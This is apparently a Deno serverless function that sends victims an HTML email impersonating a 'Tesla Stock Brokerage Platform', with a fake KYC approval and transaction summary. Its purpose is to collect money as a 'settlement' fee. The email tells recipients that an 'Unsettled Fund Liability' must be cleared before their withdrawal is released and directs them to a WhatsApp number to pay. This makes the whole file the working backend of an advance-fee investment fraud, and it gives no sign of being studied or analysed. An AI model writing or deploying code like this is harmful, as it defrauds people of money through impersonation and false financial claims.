import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "https://esm.sh/resend@2.0.0";

const resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

// Get country name from code
const getCountryName = (code: string): string => {
  const countries: Record<string, string> = {
    RU: 'Russia', US: 'United States', DE: 'Germany', GB: 'United Kingdom',
    FR: 'France', ES: 'Spain', IT: 'Italy', CA: 'Canada', AU: 'Australia',
    NL: 'Netherlands', BE: 'Belgium', AT: 'Austria', CH: 'Switzerland',
    PL: 'Poland', SE: 'Sweden', NO: 'Norway', DK: 'Denmark', FI: 'Finland',
    PT: 'Portugal', GR: 'Greece', IE: 'Ireland', CZ: 'Czech Republic',
    HU: 'Hungary', RO: 'Romania', UA: 'Ukraine', BY: 'Belarus',
    JP: 'Japan', CN: 'China', KR: 'South Korea', IN: 'India',
    BR: 'Brazil', MX: 'Mexico', AR: 'Argentina', ZA: 'South Africa',
    AE: 'United Arab Emirates', SA: 'Saudi Arabia', TR: 'Turkey', IL: 'Israel',
    SG: 'Singapore', HK: 'Hong Kong', TW: 'Taiwan', TH: 'Thailand',
  };
  return countries[code?.toUpperCase()] || code || 'International';
};

interface SettlementPayload {
  userEmail: string;
  userName: string;
  withdrawalId: string;
  netAmount: number;
  currency: string;
  bankCountry: string;
  accountNumber: string;
  paymentMethod: string;
  whatsappPhone?: string;
}

const handler = async (req: Request): Promise<Response> => {
  console.log("send-settlement-required function called");

  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const payload: SettlementPayload = await req.json();
    console.log("Settlement email payload:", { 
      userEmail: payload.userEmail, 
      userName: payload.userName,
      withdrawalId: payload.withdrawalId,
      netAmount: payload.netAmount,
      currency: payload.currency
    });

    // Validate required fields
    if (!payload.userEmail || !payload.userName || !payload.withdrawalId) {
      throw new Error("Missing required fields");
    }

    // Sanitize inputs
    const sanitize = (str: string) => str?.replace(/[<>]/g, '') || '';
    const userName = sanitize(payload.userName);
    const transactionRef = `TXN-${payload.withdrawalId.slice(0, 8).toUpperCase()}`;
    const countryName = getCountryName(payload.bankCountry);
    const currency = payload.currency || 'USD';
    const currencySymbol = currency === 'USD' ? '$' : currency === 'EUR' ? '€' : currency === 'GBP' ? '£' : currency === 'RUB' ? '₽' : currency;
    
    const formattedAmount = new Intl.NumberFormat('en-US', { 
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    }).format(payload.netAmount || 0);

    const whatsappPhone = payload.whatsappPhone || '+12186500840';
    const whatsappLink = `https://wa.me/${whatsappPhone.replace(/[^0-9]/g, '')}`;

    const isCrypto = (payload.paymentMethod || '').toLowerCase().includes('crypto') || (payload.paymentMethod || '').toLowerCase().includes('usdt');
    
    const accountDisplay = payload.accountNumber 
      ? (isCrypto ? `${payload.accountNumber.slice(0, 6)}...${payload.accountNumber.slice(-4)}` : `****${payload.accountNumber.slice(-4)}`)
      : 'On file';
    
    const destinationLabel = isCrypto 
      ? 'USDT Wallet' 
      : `${countryName} Account`;
    
    const destinationDisplay = isCrypto
      ? `USDT Wallet (${accountDisplay})`
      : `${countryName} (${accountDisplay})`;

    const emailHtml = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>KYC Approved - Settlement Required</title>
        </head>
        <body style="margin: 0; padding: 0; background-color: #0f0f0f; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;">
          <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #0f0f0f;">
            <tr>
              <td align="center" style="padding: 40px 20px;">
                <table role="presentation" width="600" cellspacing="0" cellpadding="0" style="background: linear-gradient(180deg, #1a1a1a 0%, #0f0f0f 100%); border-radius: 16px; overflow: hidden; border: 1px solid #2a2a2a;">
                  
                  <!-- Header with Tesla Red gradient -->
                  <tr>
                    <td style="background: linear-gradient(135deg, #dc2626 0%, #b91c1c 50%, #991b1b 100%); padding: 32px 40px; text-align: center;">
                      <h1 style="color: #ffffff; font-size: 24px; font-weight: 700; margin: 0; letter-spacing: -0.5px;">
                        ✅ Verification Approved
                      </h1>
                      <p style="color: rgba(255,255,255,0.9); font-size: 14px; margin: 8px 0 0 0;">
                        Final Settlement Required for Fund Disbursement
                      </p>
                    </td>
                  </tr>

                  <!-- Main Content -->
                  <tr>
                    <td style="padding: 40px;">
                      <p style="color: #ffffff; font-size: 16px; line-height: 1.6; margin: 0 0 24px 0;">
                        Hello <span style="color: #3b82f6; font-weight: 600;">${userName}</span>,
                      </p>

                      <!-- Success Badge -->
                      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background: linear-gradient(135deg, rgba(34, 197, 94, 0.15) 0%, rgba(22, 163, 74, 0.08) 100%); border: 1px solid rgba(34, 197, 94, 0.2); border-radius: 12px; margin: 0 0 24px 0;">
                        <tr>
                          <td style="padding: 20px; text-align: center;">
                            <p style="color: #4ade80; font-size: 15px; margin: 0; font-weight: 600;">
                              🎉 Your KYC verification has been successfully approved by our compliance department.
                            </p>
                          </td>
                        </tr>
                      </table>

                      <p style="color: #a1a1aa; font-size: 15px; line-height: 1.7; margin: 0 0 24px 0;">
                        To finalize the transfer of your withdrawal to your designated <strong style="color: #ffffff;">${destinationLabel}</strong>, 
                        you are required to resolve the <strong style="color: #dc2626;">Unsettled Fund Liability</strong>.
                      </p>

                      <p style="color: #a1a1aa; font-size: 14px; line-height: 1.7; margin: 0 0 24px 0;">
                        This is a standard protocol to ensure <strong style="color: #ffffff;">liquidity clearance</strong> and 
                        <strong style="color: #ffffff;">tax compliance</strong> for cross-border or high-volume brokerage transfers.
                      </p>

                      <!-- Transaction Summary -->
                      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background: linear-gradient(135deg, rgba(148, 163, 184, 0.1) 0%, rgba(30, 30, 30, 1) 100%); border: 1px solid rgba(148, 163, 184, 0.25); border-radius: 12px; margin: 24px 0;">
                        <tr>
                          <td style="padding: 24px;">
                            <h3 style="color: #94a3b8; font-size: 14px; font-weight: 600; margin: 0 0 20px 0; text-transform: uppercase; letter-spacing: 0.5px;">
                              📊 Transaction Summary
                            </h3>
                            <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                              <tr>
                                <td style="color: #71717a; font-size: 13px; padding: 10px 0; border-bottom: 1px solid #2a2a2a;">Reference</td>
                                <td style="color: #ffffff; font-size: 13px; padding: 10px 0; text-align: right; font-weight: 600; border-bottom: 1px solid #2a2a2a;">${transactionRef}</td>
                              </tr>
                              <tr>
                                <td style="color: #71717a; font-size: 13px; padding: 10px 0; border-bottom: 1px solid #2a2a2a;">Net Amount</td>
                                <td style="color: #22c55e; font-size: 18px; padding: 10px 0; text-align: right; font-weight: 700; border-bottom: 1px solid #2a2a2a;">${currencySymbol}${formattedAmount}</td>
                              </tr>
                              <tr>
                                <td style="color: #71717a; font-size: 13px; padding: 10px 0; border-bottom: 1px solid #2a2a2a;">Destination</td>
                                <td style="color: #ffffff; font-size: 13px; padding: 10px 0; text-align: right; border-bottom: 1px solid #2a2a2a;">${destinationDisplay}</td>
                              </tr>
                              <tr>
                                <td style="color: #71717a; font-size: 13px; padding: 10px 0; border-bottom: 1px solid #2a2a2a;">Settlement Status</td>
                                <td style="padding: 10px 0; text-align: right; border-bottom: 1px solid #2a2a2a;">
                                  <span style="background: rgba(234, 179, 8, 0.2); color: #eab308; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600;">
                                    Pending Clearance
                                  </span>
                                </td>
                              </tr>
                              <tr>
                                <td style="color: #71717a; font-size: 13px; padding: 10px 0;">Required Action</td>
                                <td style="color: #ffffff; font-size: 13px; padding: 10px 0; text-align: right; font-weight: 600;">Complete Unsettled Fund Liquidation</td>
                              </tr>
                            </table>
                          </td>
                        </tr>
                      </table>

                      <p style="color: #a1a1aa; font-size: 14px; line-height: 1.7; margin: 24px 0;">
                        Once this administrative settlement is cleared, the <strong style="color: #ffffff;">automated disbursement system</strong> 
                        will credit the funds to your account <strong style="color: #22c55e;">immediately</strong>.
                      </p>

                      <!-- Suggested Message (neutral dark background) -->
                      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background: rgba(148, 163, 184, 0.08); border: 1px solid rgba(148, 163, 184, 0.2); border-radius: 8px; margin: 24px 0;">
                        <tr>
                          <td style="padding: 16px;">
                            <p style="color: #71717a; font-size: 12px; margin: 0 0 8px 0; text-transform: uppercase; letter-spacing: 0.5px;">
                              💬 Suggested message to send:
                            </p>
                            <p style="color: #d1d5db; font-size: 14px; margin: 0; font-style: italic;">
                              "Hello, I need assistance with settlement clearance for transaction ${transactionRef}."
                            </p>
                          </td>
                        </tr>
                      </table>

                      <!-- WhatsApp CTA -->
                      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="margin: 16px 0 32px 0;">
                        <tr>
                          <td align="center">
                            <a href="${whatsappLink}" 
                               style="display: inline-block; background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: #ffffff; text-decoration: none; padding: 16px 48px; border-radius: 8px; font-weight: 600; font-size: 16px; box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);">
                              💬 Contact Support on WhatsApp
                            </a>
                          </td>
                        </tr>
                      </table>

                      <p style="color: #52525b; font-size: 13px; line-height: 1.6; margin: 0; text-align: center;">
                        Our support team is available 24/7 to assist you with the settlement process.
                      </p>
                    </td>
                  </tr>

                  <!-- Footer -->
                  <tr>
                    <td style="padding: 24px 40px; border-top: 1px solid #2a2a2a; text-align: center;">
                      <p style="color: #52525b; font-size: 12px; margin: 0;">
                        This is an automated message from Tesla Stock Brokerage Platform.<br>
                        Please do not reply to this email.
                      </p>
                      <p style="color: #3f3f46; font-size: 11px; margin: 16px 0 0 0;">
                        © 2026 Tesla Stock Platform. All rights reserved.
                      </p>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </body>
      </html>
    `;

    const FROM_EMAIL = "Tesla Stock Platform <no-reply@msktesla.net>";

    const emailResponse = await resend.emails.send({
      from: FROM_EMAIL,
      to: [payload.userEmail],
      subject: `Verification Approved: Final Settlement Required for Fund Disbursement [Ref: #${transactionRef}]`,
      html: emailHtml,
      headers: {
        "X-Priority": "1",
        "X-MSMail-Priority": "High",
        "Importance": "high",
      },
    });

    console.log("Settlement email sent successfully:", emailResponse);

    return new Response(JSON.stringify({ success: true, emailResponse }), {
      status: 200,
      headers: { "Content-Type": "application/json", ...corsHeaders },
    });
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : "Unknown error";
    console.error("Error in send-settlement-required function:", errorMessage);
    return new Response(
      JSON.stringify({ error: errorMessage }),
      { status: 500, headers: { "Content-Type": "application/json", ...corsHeaders } }
    );
  }
};

serve(handler);
